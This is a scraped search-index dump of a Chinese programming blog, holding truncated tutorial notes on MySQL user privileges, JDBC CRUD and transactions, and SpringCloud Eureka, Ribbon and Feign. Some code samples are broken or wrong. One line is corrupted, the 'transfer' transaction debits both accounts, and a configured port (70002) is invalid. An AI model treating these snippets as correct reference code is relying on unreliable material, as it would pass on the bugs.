FOR sanjin = PASSWORD('111111') -- 重命名 rename user 原名字 to 新名字 RENAME USER sanjin TO sanjin2 -- 用户授权 ALL PRIVILEGES 全部的权限 库，表 -- ALL PRIVILEGES 除了给别人授权，其他都能干 GRANT ALL PRIVILEGES ON *.* TO sanjin2 -- 查询权限 SHOW GRANTS FOR sanjin2 -- 查看指定用户的权限 SHOW GRANTS FOR root@localhost -- 撤销权限 REVOKE 哪些权限，在哪个库撤销，给谁撤销 REVOKE ALL PRIVILEGES ON *.* FROM sanjin2 -- 删除用户 DROP USER sanjin2` ","date":"2021-04-17","objectID":"/posts/mysql/:34:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"8.2 MySQL备份 为什么备份： 保证重要数据不丢失 数据转移 MySQL数据库备份的方式 直接拷贝物理文件 在SQLyog这种可视化工具中手动导出 在想要导出的表或者库中，右键选择备份和导出 9、规范数据库设计 当数据库比较复杂的时候，我们就需要设计了 糟糕的数据库设计： 数据冗余，浪费空间 数据库插入和删除都会麻烦，异常【屏蔽使用物理外键】 程序的性能差 良好的数据库设计： 节省内存空间 保证数据库的完整性 方便我们开发系统 软件开发中，关于数据库的设计 分析需求：分析业务和需要处理的数据库的需求 概要设计：设计关系图 E-R图 设计数据库的步骤（个人博客） 收集信息，分析需求 用户表（用户登录注销，用户的个人信息，写博客，创建分类） 分类表（文章分类，谁创建的） 文章表（文章的信息） 友链表（友链信息） 自定义表（系统信息，某个关键的字，或者某些主字段） 说说表（发表心情…id ,content ,time） 标识实体（把需求落地到每个字段） 标识实体之间的关系 写博客 user–\u003eblog 创建分类 user–\u003ecategory 关注 user–\u003euser 友链–\u003elinks 评论 user–\u003euser ","date":"2021-04-17","objectID":"/posts/mysql/:35:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"9.2三大范式 为什么需要数据规范化？ 信息重复 更新异常 插入异常 删除异常 无法正常显示异常 删除异常 丢失有效的信息 三大范式 第一范式（1NF） 原子性：保证每一列不可再分 第二范式（2NF） 前提：满足第一范式 每张表只描述一件事情 第三范式（3NF） 前提：满足第一范式和第二范式 第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关。 （规范数据库的设计） 规范性和性能的问题 关联查询的表，不得超过三张表 考虑商业化的需求和目标（成本和用户体验） 数据库的性能更加重要 再规范性能的问题的时候，需要适当的考虑一下，规范性 故意给某些表加一些冗余的字段（从多表，变成单表） 故意增加一些计算列（从大数据量降低为小数据量的查询：索引） 10、JDBC(重点) ","date":"2021-04-17","objectID":"/posts/mysql/:36:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.1 数据库驱动 驱动：声卡，显卡，数据库 我们的程序会通过数据库驱动，和数据库打交道！ ","date":"2021-04-17","objectID":"/posts/mysql/:37:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.2 JDBC SUN 公司为了简化开发人员的（对数据库的统一）操作，提供了一个(Java操作数据库的)规范，JDBC 这些规范的实现由具体的厂商去做 对于开发人员来说，我们只需要掌握JDBC的接口操作即可 java.sql javax.sql 还需要导入数据库驱动包 ","date":"2021-04-17","objectID":"/posts/mysql/:38:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.3 第一个JDBC程序 创建测试数据库 ``CREATE DATABASE jdbcStudy CHARACTER SET utf8 COLLATE utf8_general_ci; USE jdbcStudy; CREATE TABLE `users`( id INT PRIMARY KEY, NAME VARCHAR(40), PASSWORD VARCHAR(40), email VARCHAR(60), birthday DATE ); INSERT INTO `users`(id,NAME,PASSWORD,email,birthday) VALUES(1,'zhansan','123456','zs@sina.com','1980-12-04'), (2,'lisi','123456','lisi@sina.com','1981-12-04'), (3,'wangwu','123456','wangwu@sina.com','1979-12-04')`` 1.创建一个普通项目 2.导入数据库驱动 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-12VBmers-1594142971429)(C:\\Users\\53424\\AppData\\Roaming\\Typora\\typora-user-images\\1594046904540.png)] 3.编写测试代码 `package com.kuang.lesson01; //我的第一个JDBC程序 import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class JdbcFirstDemo { public static void main(String[] args) throws Exception { //1. 加载驱动 Class.forName(\"com.mysql.jdbc.Driver\");//固定写法 //2. 用户信息和url //useUnicode=true\u0026characterEncoding=utf8\u0026\u0026useSSL=true String url =\"jdbc:mysql://localhost:3306/jdbcstudy?useUnicode=true\u0026characterEncoding=utf8\u0026\u0026useSSL=false\"; String name = \"root\"; String password = \"123456\"; //3. 连接成功，返回数据库对象 connection代表数据库 Connection connection= DriverManager.getConnection(url,name,password); //4. 执行SQL的对象 statement 执行SQL的对象 Statement statement = connection.createStatement(); //5. 执行SQL的对象 去执行SQL 可能存在结果，查看返回结果 String sql=\"SELECT * FROM users\"; ResultSet resultSet = statement.executeQuery(sql);//返回的结果集,结果集中封装了我们全部查询的结果 while(resultSet.next()){ System.out.println(\"id+\"+resultSet.getObject(\"id\")); System.out.println(\"name+\"+resultSet.getObject(\"NAME\")); System.out.println(\"password+\"+resultSet.getObject(\"PASSWORD\")); System.out.println(\"email+\"+resultSet.getObject(\"email\")); System.out.println(\"birthday+\"+resultSet.getObject(\"birthday\")); } //6. 释放连接 resultSet.close(); statement.close(); connection.close(); } }` 步骤总结： 1.加载驱动 2.连接数据库 DriverManager 3.获取执行SQL的对象 Statement 4.获得返回的结果集 5.释放连接 DriverManager `//DriverManager.registerDriver(new com.","date":"2021-04-17","objectID":"/posts/mysql/:39:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.4statement对象 Jdbc中的statement对象用于向数据库发送SQL语句，想完成对数据库的增删改查，只需要通过这个对象向数据库发送增删改查语句即可。 Statement对象的executeUpdate方法，用于向数据库发送增、删、改的sq|语句， executeUpdate执行完后， 将会返回一个整数(即增删改语句导致了数据库几行数据发生了变化)。 Statement.executeQuery方法用于向数据库发生查询语句，executeQuery方法返回代表查询结果的ResultSet对象。 CRUD操作-create 使用executeUpdate(String sql)方法完成数据添加操作，示例操作： `Statement statement = connection.createStatement(); String sql = \"insert into user(...) values(...)\"; int num = statement.executeUpdate(sql); if(num\u003e0){ System.out.println(\"插入成功\"); }` CRUD操作-delete 使用executeUpdate(String sql)方法完成数据删除操作，示例操作： `Statement statement = connection.createStatement(); String sql = \"delete from user where id =1\"; int num = statement.executeUpdate(sql); if(num\u003e0){ System.out.println(\"删除成功\"); }` CURD操作-update 使用executeUpdate(String sql)方法完成数据修改操作，示例操作： `Statement statement = connection.createStatement(); String sql = \"update user set name ='' where name = ''\"; int num = statement.executeUpdate(sql); if(num\u003e0){ System.out.println(\"修改成功\"); }` CURD操作-read 使用executeUpdate(String sql)方法完成数据查询操作，示例操作： `Statement statement = connection.createStatement(); String sql = \"select * from user where id =1\"; ResultSet rs= statement.executeQuery(sql); if(rs.next()){ System.out.println(\"\"); }` 代码实现 1.提取工具类 `package com.kuang.lesson02.utils; import java.io.IOException; import java.io.InputStream; import java.sql.*; import java.util.Properties; public class JdbcUtils { private static String driver = null; private static String url = null; private static String username = null; private static String password = null; static { try{ InputStream in = JdbcUtils.class.getClassLoader().getResourceAsStream(\"db.properties\"); Properties properties = new Properties(); properties.load(in); driver=properties.getProperty(\"driver\"); url=properties.getProperty(\"url\"); user); password=properties.getProperty(\"password\"); //1.驱动只用加载一次 Class.forName(driver); } catch (IOException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } } //2.获","date":"2021-04-17","objectID":"/posts/mysql/:40:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.5 PreparedStatement对象 PreparedStatement 可以防止SQL注入 ，效率更高。 新增 删除 查询 ``package com.kuang.lesson03; import com.kuang.lesson02.utils.JdbcUtils; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class Test { public static void main(String[] args) { Connection connection= null; PreparedStatement pstm=null; try { connection = JdbcUtils.getConnection(); //区别 //使用问好占位符代替参数 String sql = \"insert into users(id,`NAME`) values(?,?)\"; pstm = connection.prepareStatement(sql);//预编译sql，先写sql然后不执行 //手动赋值 pstm.setInt(1,8); pstm.setString(2,\"SANJIN\"); //执行 int i = pstm.executeUpdate(); if (i\u003e0){ System.out.println(\"插入成功\"); } } catch (Exception e) { e.printStackTrace(); }finally { try { JdbcUtils.release(connection,pstm,null); } catch (SQLException throwables) { throwables.printStackTrace(); } } } }`` 防止SQL注入本质，传递字符 带有“ ”，转义字符会被转义 ","date":"2021-04-17","objectID":"/posts/mysql/:41:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.6 使用IDEA连接数据库 连接成功后，可以选择数据库 双击数据库 更新数据 编写sql代码的地方 ","date":"2021-04-17","objectID":"/posts/mysql/:42:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.7 JDBC事务 要么都成功，要么都失败 ACID原则 原子性：要么全部完成，要么都不完成 一致性：结果总数不变 隔离性：多个进程互不干扰 持久性：一旦提交不可逆，持久化到数据库了 隔离性的问题： 脏读： 一个事务读取了另一个没有提交的事务 不可重复读：在同一个事务内，重复读取表中的数据，表发生了改变 虚读（幻读）：在一个事务内，读取到了别人插入的数据，导致前后读出来的结果不一致 代码实现 开启事务conn.setAutoCommit(false); 一组业务执行完毕，提交事务 可以在catch语句中显示的定义回滚，但是默认失败会回滚 `package com.kuang.lesson04; import com.kuang.lesson02.utils.JdbcUtils; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class Action { public static void main(String[] args) { Connection conn =null; PreparedStatement ps = null; ResultSet rs = null; try { conn = JdbcUtils.getConnection(); //关闭数据库的自动提交功能， 开启事务 conn.setAutoCommit(false); //自动开启事务 String sql = \"update account set money = money-500 where id = 1\"; ps =conn.prepareStatement(sql); ps.executeUpdate(); String sql2 = \"update account set money = money-500 where id = 2\"; ps=conn.prepareStatement(sql2); ps.executeUpdate(); //业务完毕，提交事务 conn.commit(); System.out.println(\"操作成功\"); } catch (Exception e) { try { //如果失败，则默认回滚 conn.rollback();//如果失败，回滚 } catch (SQLException throwables) { throwables.printStackTrace(); } e.printStackTrace(); }finally { try { JdbcUtils.release(conn,ps,rs); } catch (SQLException throwables) { throwables.printStackTrace(); } } } }` ","date":"2021-04-17","objectID":"/posts/mysql/:43:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["数据库"],"content":"10.8数据库连接池 数据库连接–执行完毕–释放 连接–释放 十分浪费资源 池化技术： 准备一些预先的资源，过来就连接预先准备好的 常用连接数 100 最少连接数：100 最大连接数 ： 120 业务最高承载上限 排队等待， 等待超时：100ms 编写连接池，实现一个接口 DateSource 开源数据源实现(拿来即用) DBCP C3P0 Druid: 阿里巴巴 使用了这些数据库连接池之后，我们在项目开发中就不需要编写连接数据库的代码了 DBCP 需要用到的jar包 dbcp.ar C3P0 结论 无论使用什么数据源，本质是不变的，DateSource接口不会变，方法就不会变 ","date":"2021-04-17","objectID":"/posts/mysql/:44:0","tags":["MySQL"],"title":"MySQL","uri":"/posts/mysql/"},{"categories":["Java后端"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-04-17","objectID":"/posts/springcloud/:0:0","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"1. 微服务概述 1.1 什么是微服务？ **什么是微服务？**微服务(Microservice Architecture) 是近几年流行的一种架构思想，关于它的概念很难一言以蔽之。 究竟什么是微服务呢？我们在此引用ThoughtWorks 公司的首席科学家 Martin Fowler 于2014年提出的一段话： 原文：https://martinfowler.com/articles/microservices.html 汉化：https://www.cnblogs.com/liuning8023/p/4493156.html 就目前而言，对于微服务，业界并没有一个统一的，标准的定义。 但通常而言，微服务架构是一种架构模式，或者说是一种架构风格，它体长将单一的应用程序划分成一组小的服务，每个服务运行在其独立的自己的进程内，服务之间互相协调，互相配置，为用户提供最终价值，服务之间采用轻量级的通信机制(HTTP)互相沟通，每个服务都围绕着具体的业务进行构建，并且能狗被独立的部署到生产环境中，另外，应尽量避免统一的，集中式的服务管理机制，对具体的一个服务而言，应该根据业务上下文，选择合适的语言，工具(Maven)对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储。 再来从技术维度角度理解下： 微服务化的核心就是将传统的一站式应用，根据业务拆分成一个一个的服务，彻底地去耦合，每一个微服务提供单个业务功能的服务，一个服务做一件事情，从技术角度看就是一种小而独立的处理过程，类似进程的概念，能够自行单独启动或销毁，拥有自己独立的数据库。 1.2 微服务与微服务架构 微服务 强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题/提供落地对应服务的一个服务应用，狭义的看，可以看作是IDEA中的一个个微服务工程，或者Moudel。 IDEA 工具里面使用Maven开发的一个个独立的小Moudel，它具体是使用SpringBoot开发的一个小模块，专业的事情交给专业的模块来做，一个模块就做着一件事情。 强调的是一个个的个体，每个个体完成一个具体的任务或者功能。 微服务架构 一种新的架构形式，Martin Fowler 于2014年提出。 微服务架构是一种架构模式，它体长将单一应用程序划分成一组小的服务，服务之间相互协调，互相配合，为用户提供最终价值。每个服务运行在其独立的进程中，服务与服务之间采用轻量级的通信机制**(如HTTP)互相协作，每个服务都围绕着具体的业务进行构建，并且能够被独立的部署到生产环境中，另外，应尽量避免统一的，集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具(如Maven)**对其进行构建。 1.3 微服务优缺点 优点 单一职责原则； 每个服务足够内聚，足够小，代码容易理解，这样能聚焦一个指定的业务功能或业务需求； 开发简单，开发效率高，一个服务可能就是专一的只干一件事； 微服务能够被小团队单独开发，这个团队只需2-5个开发人员组成； 微服务是松耦合的，是有功能意义的服务，无论是在开发阶段或部署阶段都是独立的； 微服务能使用不同的语言开发； 易于和第三方集成，微服务允许容易且灵活的方式集成自动部署，通过持续集成工具，如jenkins，Hudson，bamboo； 微服务易于被一个开发人员理解，修改和维护，这样小团队能够更关注自己的工作成果，无需通过合作才能体现价值； 微服务允许利用和融合最新技术； 微服务只是业务逻辑的代码，不会和HTML，CSS，或其他的界面混合; 每个微服务都有自己的存储能力，可以有自己的数据库，也可以有统一的数据库； 缺点 开发人员要处理分布式系统的复杂性； 多服务运维难度，随着服务的增加，运维的压力也在增大； 系统部署依赖问题； 服务间通信成本问题； 数据一致性问题； 系统集成测试问题； 性能和监控问题； 1.4 微服务技术栈有那些？ 微服务技术条目落地技术服务开发SpringBoot、Spring、SpringMVC等服务配置与管理Netfix公司的Archaius、阿里的Diamond等服务注册与发现Eureka、Consul、Zookeeper等服务调用Rest、PRC、gRPC服务熔断器Hystrix、Envoy等负载均衡Ribbon、Nginx等服务接口调用(客户端调用服务的简化工具)Fegin等消息队列Kafka、RabbitMQ、ActiveMQ等服务配置中心管理SpringCloudConfig、Chef等服务路由(API网关)Zuul等服务监控Zabbix、Nagios、Metrics、Specatator等全链路追踪Zipkin、Brave、Dapper等数据流操作开发包Sp","date":"2021-04-17","objectID":"/posts/springcloud/:0:1","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"2. SpringCloud入门概述 2.1 SpringCloud是什么？ Spring官网：https://spring.io/ Spring Cloud provides tools for developers to quickly build some of the common patterns in distributed systems (e.g. configuration management, service discovery, circuit breakers, intelligent routing, micro-proxy, control bus, one-time tokens, global locks, leadership election, distributed sessions, cluster state). Coordination of distributed systems leads to boiler plate patterns, and using Spring Cloud developers can quickly stand up services and applications that implement those patterns. They will work well in any distributed environment, including the developer’s own laptop, bare metal data centres, and managed platforms such as Cloud Foundry. 翻译： Spring Cloud为开发人员提供了快速构建分布式系统中的一些常见模式的工具(例如配置管理、服务发现、断路器、智能路由、微代理、控制总线、一次性令牌、全局锁、领导人选举、分布式会话、集群状态)。分布式系统的协调导致了锅炉板模式，而使用Spring Cloud开发人员可以快速建立实现这些模式的服务和应用程序。它们在任何分布式环境中都能很好地工作，包括开发人员自己的笔记本电脑、裸金属数据中心和云计算等托管平台。 2.2 SpringCloud和SpringBoot的关系 SpringBoot专注于开苏方便的开发单个个体微服务； SpringCloud是关注全局的微服务协调整理治理框架，它将SpringBoot开发的一个个单体微服务，整合并管理起来，为各个微服务之间提供：配置管理、服务发现、断路器、路由、为代理、事件总栈、全局锁、决策竞选、分布式会话等等集成服务； SpringBoot可以离开SpringCloud独立使用，开发项目，但SpringCloud离不开SpringBoot，属于依赖关系； SpringBoot专注于快速、方便的开发单个个体微服务，SpringCloud关注全局的服务治理框架； 2.3 Dubbo 和 SpringCloud技术选型 1. 分布式+服务治理Dubbo 目前成熟的互联网架构，应用服务化拆分+消息中间件 2. Dubbo 和 SpringCloud对比 可以看一下社区活跃度： https://github.com/dubbo https://github.com/spring-cloud 对比结果： DubboSpringCloud服务注册中心ZookeeperSpring Cloud Netfilx Eureka服务调用方式RPCREST API服务监控Dubbo-monitorSpring Boot Admin断路器不完善Spring Cloud Netfilx Hystrix服务网关无Spring Cloud Netfilx Zuul分布式配置无Spring Cloud Config服务跟踪无Spring Cloud Sleuth消息总栈无Spring Cloud Bus数据流无Spring Cloud Stream批量任务无Spring Cloud Task 最大区别：Spring Cloud 抛弃了Dubbo的RPC通信，采用的是基于HTTP的REST方式 严格来说，这两种方式各有优劣。虽然从一定程度上来说，后者牺牲了服务调用的性能，但也避免了上面提到的原生RPC带来的问题。而且REST相比RPC更为灵活，服务提供方和调用方的依赖只依靠一纸契约，不存在代码级别的强依赖，这个优点在当下强调快速演化的微服务环境下，显得更加合适。 品牌机和组装机的区别 社区支持与更新力度的区别 总结： 二者解决的问题域不一样：Dubbo的定位是一款RPC框架，而SpringCloud的目标是微服务架构下的一站式解决方案。 2.4 SpringCloud能干嘛？ Distrib","date":"2021-04-17","objectID":"/posts/springcloud/:0:2","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"3. SpringCloud Rest学习环境搭建：服务提供者 3.1 介绍 我们会使用一个Dept部门模块做一个微服务通用案例Consumer消费者(Client)通过REST调用Provider提供者(Server)提供的服务。 回顾Spring，SpringMVC，Mybatis等以往学习的知识。 Maven的分包分模块架构复习。 `一个简单的Maven模块结构是这样的： -- app-parent: 一个父项目(app-parent)聚合了很多子项目(app-util\\app-dao\\app-web...) |-- pom.xml | |-- app-core ||---- pom.xml | |-- app-web ||---- pom.xml ......` 一个父工程带着多个Moudule子模块 MicroServiceCloud父工程(Project)下初次带着3个子模块(Module) microservicecloud-api 【封装的整体entity/接口/公共配置等】 microservicecloud-consumer-dept-80 【服务提供者】 microservicecloud-provider-dept-8001 【服务消费者】 3.2 SpringCloud版本选择 大版本说明 SpringBootSpringCloud关系1.2.xAngel版本(天使)兼容SpringBoot1.2x1.3.xBrixton版本(布里克斯顿)兼容SpringBoot1.3x，也兼容SpringBoot1.4x1.4.xCamden版本(卡姆登)兼容SpringBoot1.4x，也兼容SpringBoot1.5x1.5.xDalston版本(多尔斯顿)兼容SpringBoot1.5x，不兼容SpringBoot2.0x1.5.xEdgware版本(埃奇韦尔)兼容SpringBoot1.5x，不兼容SpringBoot2.0x2.0.xFinchley版本(芬奇利)兼容SpringBoot2.0x，不兼容SpringBoot1.5x2.1.xGreenwich版本(格林威治) 实际开发版本关系 spring-boot-starter-parentspring-cloud-dependencles版本号发布日期版本号发布日期1.5.2.RELEASE2017-03Dalston.RC12017-x1.5.9.RELEASE2017-11Edgware.RELEASE2017-111.5.16.RELEASE2018-04Edgware.SR52018-101.5.20.RELEASE2018-09Edgware.SR52018-102.0.2.RELEASE2018-05Fomchiey.BULD-SNAPSHOT2018-x2.0.6.RELEASE2018-10Fomchiey-SR22018-102.1.4.RELEASE2019-04Greenwich.SR12019-03 使用后两个 3.3 创建父工程 新建父工程项目springcloud，切记Packageing是pom模式 主要是定义POM文件，将后续各个子模块公用的jar包等统一提取出来，类似一个抽象父类 pom.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003ecom.haust\u003c/groupId\u003e \u003cartifactId\u003espringcloud\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cmodules\u003e \u003cmodule\u003espringcloud-api\u003c/module\u003e \u003cmodule\u003espringcloud-provider-dept-8001\u003c/module\u003e \u003cmodule\u003espringcloud-consumer-dept-80\u003c/module\u003e \u003cmodule\u003espringcloud-eureka-7001\u003c/module\u003e \u003cmodule\u003espringcloud-eureka-70002\u003c/module\u003e \u003cmodule\u003espringcloud-eurek","date":"2021-04-17","objectID":"/posts/springcloud/:0:3","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"4. Eureka服务注册与发现 4.1 什么是Eureka Netflix在涉及Eureka时，遵循的就是API原则. Eureka是Netflix的有个子模块，也是核心模块之一。Eureka是基于REST的服务，用于定位服务，以实现云端中间件层服务发现和故障转移，服务注册与发现对于微服务来说是非常重要的，有了服务注册与发现，只需要使用服务的标识符，就可以访问到服务，而不需要修改服务调用的配置文件了，功能类似于Dubbo的注册中心，比如Zookeeper. 4.2 原理理解 Eureka基本的架构 Springcloud 封装了Netflix公司开发的Eureka模块来实现服务注册与发现 (对比Zookeeper). Eureka采用了C-S的架构设计，EurekaServer作为服务注册功能的服务器，他是服务注册中心. 而系统中的其他微服务，使用Eureka的客户端连接到EurekaServer并维持心跳连接。这样系统的维护人员就可以通过EurekaServer来监控系统中各个微服务是否正常运行，Springcloud 的一些其他模块 (比如Zuul) 就可以通过EurekaServer来发现系统中的其他微服务，并执行相关的逻辑. 和Dubbo架构对比. Eureka 包含两个组件：Eureka Server 和 Eureka Client. Eureka Server 提供服务注册，各个节点启动后，回在EurekaServer中进行注册，这样Eureka Server中的服务注册表中将会储存所有课用服务节点的信息，服务节点的信息可以在界面中直观的看到. Eureka Client 是一个Java客户端，用于简化EurekaServer的交互，客户端同时也具备一个内置的，使用轮询负载算法的负载均衡器。在应用启动后，将会向EurekaServer发送心跳 (默认周期为30秒) 。如果Eureka Server在多个心跳周期内没有接收到某个节点的心跳，EurekaServer将会从服务注册表中把这个服务节点移除掉 (默认周期为90s). 三大角色 Eureka Server：提供服务的注册与发现 Service Provider：服务生产方，将自身服务注册到Eureka中，从而使服务消费方能狗找到 Service Consumer：服务消费方，从Eureka中获取注册服务列表，从而找到消费服务 目前工程状况 4.3 构建步骤 1. eureka-server springcloud-eureka-7001 模块建立 pom.xml 配置 `\u003c!--导包~--\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-eureka-server --\u003e \u003c!--导入Eureka Server依赖--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.cloud\u003c/groupId\u003e \u003cartifactId\u003espring-cloud-starter-eureka-server\u003c/artifactId\u003e \u003cversion\u003e1.4.6.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003c!--热部署工具--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-devtools\u003c/artifactId\u003e \u003c/dependency\u003e \u003c/dependencies\u003e` application.yml `server: port: 7001 #Eureka配置 eureka: instance: hostname: localhost #Eureka服务端的实例名字 client: register-with-eureka: false #表示是否向 Eureka 注册中心注册自己(这个模块本身是服务器,所以不需要) fetch-registry: false #fetch-registry如果为false,则表示自己为注册中心 service-url: #监控页面~ #重写Eureka的默认端口以及访问路径 ---\u003ehttp://localhost:7001/eureka/ defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/` 源码中Eureka的默认端口以及访问路径: 主启动类 `//启动之后，访问 http://localhost:7001/ @","date":"2021-04-17","objectID":"/posts/springcloud/:0:4","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"5. Ribbon：负载均衡(基于客户端) 5.1 负载均衡以及Ribbon Ribbon是什么？ Spring Cloud Ribbon 是基于Netflix Ribbon 实现的一套客户端负载均衡的工具。 简单的说，Ribbon 是 Netflix 发布的开源项目，主要功能是提供客户端的软件负载均衡算法，将 Netflix 的中间层服务连接在一起。Ribbon 的客户端组件提供一系列完整的配置项，如：连接超时、重试等。简单的说，就是在配置文件中列出 LoadBalancer (简称LB：负载均衡) 后面所有的及其，Ribbon 会自动的帮助你基于某种规则 (如简单轮询，随机连接等等) 去连接这些机器。我们也容易使用 Ribbon 实现自定义的负载均衡算法！ Ribbon能干嘛？ LB，即负载均衡 (LoadBalancer) ，在微服务或分布式集群中经常用的一种应用。 负载均衡简单的说就是将用户的请求平摊的分配到多个服务上，从而达到系统的HA (高用)。 常见的负载均衡软件有 Nginx、Lvs 等等。 Dubbo、SpringCloud 中均给我们提供了负载均衡，SpringCloud 的负载均衡算法可以自定义。 负载均衡简单分类： 集中式LB 即在服务的提供方和消费方之间使用独立的LB设施，如Nginx，由该设施负责把访问请求通过某种策略转发至服务的提供方！ 进程式LB 将LB逻辑集成到消费方，消费方从服务注册中心获知有哪些地址可用，然后自己再从这些地址中选出一个合适的服务器。 Ribbon 就属于进程内LB，它只是一个类库，集成于消费方进程，消费方通过它来获取到服务提供方的地址！ 5.2 集成Ribbon springcloud-consumer-dept-80向pom.xml中添加Ribbon和Eureka依赖 `\u003c!--Ribbon--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.cloud\u003c/groupId\u003e \u003cartifactId\u003espring-cloud-starter-ribbon\u003c/artifactId\u003e \u003cversion\u003e1.4.6.RELEASE\u003c/version\u003e \u003c/dependency\u003e \u003c!--Eureka: Ribbon需要从Eureka服务中心获取要拿什么--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.cloud\u003c/groupId\u003e \u003cartifactId\u003espring-cloud-starter-eureka\u003c/artifactId\u003e \u003cversion\u003e1.4.6.RELEASE\u003c/version\u003e \u003c/dependency\u003e` 在application.yml文件中配置Eureka `# Eureka配置 eureka: client: register-with-eureka: false # 不向 Eureka注册自己 service-url: # 从三个注册中心中随机取一个去访问 defaultZone: http://eureka700fxgfj1.com:7001/eureka/,http://eureka700fxgfj2.com:70002/eureka/,http://eureka700fxgfj3.com:7003/eureka/` 主启动类加上@EnableEurekaClient注解，开启Eureka `//Ribbon 和 Eureka 整合以后，客户端可以直接调用，不用关心IP地址和端口号 @SpringBootApplication @EnableEurekaClient //开启Eureka 客户端 public class DeptConsumer_80 { public static void main(String[] args) { SpringApplication.run(DeptConsumer_80.class, args); } }` 自定义Spring配置类：ConfigBean.java 配置负载均衡实现RestTemplate `@Configuration public class ConfigBean {//@Configuration -- spring applicationContext.xml @LoadBalanced //配置负载均衡实现RestTemplate @Bean public RestTemplate getRestTemplate() { return new RestTemplate(); } }` 修改conroller：DeptConsumerController.java `//Ribbon:我们这里的地址，","date":"2021-04-17","objectID":"/posts/springcloud/:0:5","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["Java后端"],"content":"6.Feign：负载均衡(基于服务端) 6.1 Feign简介 Feign是声明式Web Service客户端，它让微服务之间的调用变得更简单，类似controller调用service。SpringCloud集成了Ribbon和Eureka，可以使用Feigin提供负载均衡的http客户端 只需要创建一个接口，然后添加注解即可~ Feign，主要是社区版，大家都习惯面向接口编程。这个是很多开发人员的规范。调用微服务访问两种方法 微服务名字 【ribbon】 接口和注解 【feign】 Feign能干什么？ Feign旨在使编写Java Http客户端变得更容易 前面在使用Ribbon + RestTemplate时，利用RestTemplate对Http请求的封装处理，形成了一套模板化的调用方法。但是在实际开发中，由于对服务依赖的调用可能不止一处，往往一个接口会被多处调用，所以通常都会针对每个微服务自行封装一个客户端类来包装这些依赖服务的调用。所以，Feign在此基础上做了进一步的封装，由他来帮助我们定义和实现依赖服务接口的定义，在Feign的实现下，我们只需要创建一个接口并使用注解的方式来配置它 (类似以前Dao接口上标注Mapper注解，现在是一个微服务接口上面标注一个Feign注解)，即可完成对服务提供方的接口绑定，简化了使用Spring Cloud Ribbon 时，自动封装服务调用客户端的开发量。 Feign默认集成了Ribbon 利用Ribbon维护了MicroServiceCloud-Dept的服务列表信息，并且通过轮询实现了客户端的负载均衡，而与Ribbon不同的是，通过Feign只需要定义服务绑定接口且以声明式的方法，优雅而简单的实现了服务调用。 6.2 Feign的使用步骤 创建springcloud-consumer-fdept-feign模块 拷贝springcloud-consumer-dept-80模块下的pom.xml，resource，以及java代码到springcloud-consumer-feign模块，并添加feign依赖。 `\u003c!--Feign的依赖--\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.cloud\u003c/groupId\u003e \u003cartifactId\u003espring-cloud-starter-feign\u003c/artifactId\u003e \u003cversion\u003e1.4.6.RELEASE\u003c/version\u003e \u003c/dependency\u003e` 通过Ribbon实现：—原来的controller：DeptConsumerController.java `package com.haust.springcloud.controller; import com.haust.springcloud.pojo.Dept; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestMapping; import 